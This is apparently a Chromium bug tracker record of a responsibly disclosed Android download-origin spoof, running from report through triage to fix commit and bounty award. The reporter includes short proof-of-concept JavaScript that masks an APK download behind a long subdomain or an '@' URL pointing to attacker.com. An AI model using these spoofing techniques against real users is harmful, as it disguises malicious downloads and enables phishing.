# File Download Origin Spoof Using Long Subdomain

| Field | Value |
|-------|-------|
| **Issue ID** | [40058315](https://issues.chromium.org/issues/40058315) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Android |
| **Reporter** | sh...@gmail.com |
| **Assignee** | sh...@chromium.org |
| **Created** | 2021-12-21 |
| **Bounty** | $3,000.00 |

## Description

Steps to reproduce the problem:
1. Open Chrome or any Chromium browsers for Android and visit:

http://sha4.ezyro.com/dspoof.html

2. Click on "Download Chrome" button to open legit domain "Google.com" and initiate the download of "POC.apk" from evil domain.
3. You will notice a pop-up to download the apk. 
4. After the POC.apk get's downloaded open the Download section of Chrome browser.
5. You will notice the long subdomain is shifting the main domain to the right side.

##Code Used:

<script>
function a(){
	window.open('https://google.com', 'x'); //LEGIT DOMAIN
	setTimeout(function(){
		window.open('http://chrome-downloads.google.communication.unaux.com/POC.apk', 'x'); //LONG-SUBDOMAIN
	}, 5000);
}
</script>

What is the expected behavior?
The long subdomain should be shifted to the left side inside the download section of the browser so that the main domain can be seen clearly.

What went wrong?
Long subdomain is shifting the main domain to the right side of the browser which can be ab-used to mask the domain of the downloaded files.

Did this work before? N/A 

Chrome version: 96.0.4664.110  Channel: stable
OS Version:

## Attachments

- [LSdspoof.html](attachments/LSdspoof.html) (text/plain, 614 B)
- [Display-6.5inches.jpg](attachments/Display-6.5inches.jpg) (image/jpeg, 283.1 KB)
- [PoC.mp4](attachments/PoC.mp4) (video/mp4, 7.0 MB)
- [Screenshot_20230720_141641_Chrome.jpg](attachments/Screenshot_20230720_141641_Chrome.jpg) (image/jpeg, 63.9 KB)
- [IMG_20230721_032455.jpg](attachments/IMG_20230721_032455.jpg) (image/jpeg, 95.1 KB)

## Timeline

### [Deleted User] (2021-12-21)

[Empty comment from Monorail migration]

### wf...@chromium.org (2021-12-22)

Thanks for your report. Chris, as expert in URL display can you take a look at this and triage this? Adding some download folks too.

[Monorail components: UI>Browser>Downloads]

### [Deleted User] (2021-12-22)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-22)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ct...@chromium.org (2021-12-23)

Yeah, the downloads listing should ideally elide the domain on the left rather than on the right. Since this is only showing the hostname and not the full URL this should be relatively easy -- if this is a TextView, then the `ellipsize` property should be set to `start` rather than `end`.

Re-assigning this to qinmin@ as a downloads owner, but I'm happy to help or answer more questions.

### qi...@chromium.org (2021-12-23)

assigning to shaktisahu@ for download item display on download home .

### [Deleted User] (2022-01-05)

shaktisahu: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-17)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@gmail.com (2022-01-25)

Hi team, I noticed that in some chromium browsers like `Samsung` and `Microsoft Edge` there's another way to spoof the downloaded files domain using @ character. Chrome and some other browsers like Brave, Kiwi, Yandex etc., seems to be safe with this method.

##Code:
```
<script>
function a(){
	window.open('https://google.com', 'x');
	setTimeout(function(){
		window.open('https://anylegitsite.com@attacker.com/POC.apk', 'x');
	}, 5000); // here @ character can be used to spoof the domain of downloaded files.
}
</script> 
  <center><input type="button" value="DOWNLOAD CHROME" onclick="a()"> </center>
```

If you want me to file a separate report for this issue then do let me know else we can continue here.

### qi...@chromium.org (2022-01-25)

Filing a separate result will be better

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### xi...@chromium.org (2022-02-06)

[Empty comment from Monorail migration]

### xi...@chromium.org (2022-02-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-09)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-21)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-02)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-12)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-23)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### th...@chromium.org (2022-06-10)

Security marshal here. shaktisahu@, could you confirm you intend to take a look at this, or if not, could you help re-triage?

### [Deleted User] (2022-07-11)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-21)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-08-01)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-08-03)

[Empty comment from Monorail migration]

### sh...@gmail.com (2022-09-17)

[Comment Deleted]

### [Deleted User] (2022-09-28)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-28)

This issue has not been updated for 60 or more days - lowering its priority to P2.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-08)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-05)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2023-07-20)

I can't repro this bug.  When I click on the link nothing happens, I see this screen.


### sh...@chromium.org (2023-07-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2023-07-20)

cthomp@ - What is the correct behavior? Should we elide it from the middle or from the start?
We also have a long filename with extension issue which is similar. https://bugs.chromium.org/p/chromium/issues/detail?id=1456876

Feels like we shoudl set android:ellipsize to start or middle. Would love to know if there are other examples.

### sh...@gmail.com (2023-07-20)

Hi shaktisahu@, 
I have updated the POC link:
https://lnmi.unaux.com/dspoof.html

or you can simply open the direct file URL:
http://chrome-downloads.google.communication.unaux.com/POC.apk

Make sure to clear the browser caches as I have re-created the subdomain few minutes back. 


### ct...@chromium.org (2023-07-20)

As this is only showing the domain, we should elide from the start (see c#5 above). 

It looks like in the time since this was originally reported the specific domain was blocked by Safe Browsing. If you are testing in an emulator, it is likely fine to click through the warning, but I think we can fix this and test locally without needing the live site. If you need another live site that has a very long subdomain for testing purposes, we maintain https://longextendedsubdomainnamewithoutdashesinordertotestwordwrapping.badssl.com/ (but it does not have specific download behavior).

### xi...@chromium.org (2023-07-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2023-07-20)

Thank you. I managed to download a file with long filename. Could you also comment on long filename as reported in crbug/1456876. Should we also do elide from start to have the extension show up?

### sh...@chromium.org (2023-07-21)

WIP CL: https://chromium-review.googlesource.com/c/chromium/src/+/4706260

### [Deleted User] (2023-08-16)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-09-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/6c1a0cec38d714f2c82c9bdb319409c597781acd

commit 6c1a0cec38d714f2c82c9bdb319409c597781acd
Author: Shakti Sahu <shaktisahu@chromium.org>
Date: Wed Sep 20 22:41:24 2023

Elide filename and domains on start to show the extension / eTLD+1

Two changes:
1. The download home list item title was modified to make room for
file name extension and was elided in the middle. This is in line
with what notification does today.
2. The download home list item description was also modified in a
similar way as the notification code currently does. For very long
URLs it will prioritize showing only the eTLD+1.

Screenshot: https://screenshot.googleplex.com/8Yur9538FCobUun
Bug: 1281972, 1456876
Change-Id: I5982266bfe5698105d3bc31dcacf9d89b9455863
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4706260
Reviewed-by: David Trainor <dtrainor@chromium.org>
Commit-Queue: Shakti Sahu <shaktisahu@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1199282}

[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/holder/AudioViewHolder.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/components/browser_ui/util/android/java/src/org/chromium/components/browser_ui/util/DownloadUtils.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/android/java/src/org/chromium/chrome/browser/download/DownloadNotificationFactory.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/holder/PrefetchArticleViewHolder.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/UiUtils.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/holder/PrefetchGroupedItemViewHolder.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/holder/InProgressGenericViewHolder.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/holder/InProgressVideoViewHolder.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/holder/VideoViewHolder.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/DownloadActivityV2Test.java
[modify] https://crrev.com/6c1a0cec38d714f2c82c9bdb319409c597781acd/chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/holder/GenericViewHolder.java


### sh...@chromium.org (2023-09-25)

Fixed with CL in https://crbug.com/chromium/1281972#c42

### [Deleted User] (2023-09-25)

[Empty comment from Monorail migration]

### [Deleted User] (2023-09-25)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-09-28)

[Empty comment from Monorail migration]

### am...@google.com (2023-09-29)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-09-29)

Congratulations! The Chrome VRP Panel has decided to award you $3,000 for this report. Thank you for your efforts and reporting this issue to us! 

### sh...@gmail.com (2023-09-29)

Thank you team for the bounty decision.

### am...@google.com (2023-09-30)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-10-03)

[Empty comment from Monorail migration]

### pg...@google.com (2023-10-30)

[Empty comment from Monorail migration]

### pg...@google.com (2023-11-01)

[Empty comment from Monorail migration]

### pg...@google.com (2023-11-01)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2024-01-02)

[Empty comment from Monorail migration]

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1281972?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1294520, crbug.com/chromium/1389289, crbug.com/chromium/1442642, crbug.com/chromium/1446543]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058315)*
